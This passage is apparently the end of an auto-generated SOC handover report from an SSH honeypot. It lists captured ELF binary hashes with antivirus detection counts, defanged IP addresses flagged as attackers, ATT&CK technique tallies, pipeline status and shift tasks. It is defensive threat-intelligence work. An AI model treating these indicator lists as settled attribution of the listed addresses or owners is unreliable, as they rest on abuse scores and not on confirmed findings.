| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `36.151.144[.]184` | CN | China Mobile Communications Corporation | **100** ⚠️ | 3 |
| `151.237.67[.]196` | BG | PON.BG Ltd. | **100** ⚠️ | 0 |
| `98.82.6[.]93` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 20 |
| `98.252.96[.]161` | US | Comcast Cable Communications, Inc. | **100** ⚠️ | 0 |
| `159.89.106[.]4` | DE | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `152.32.171[.]133` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 3 |
| `185.9.193[.]111` | ES | Nunsys SA | **100** ⚠️ | 21 |
| `165.154.5[.]249` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 33 |
| `188.79.93[.]151` | ES | Jazztel triple play services | **100** ⚠️ | 1 |
| `103.218.241[.]179` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 22 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 76 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 39 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 120 cases |
| Tool 34  | Credential Extractor        | ✅ 58 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (5.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 39 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-28T14:22:06Z_
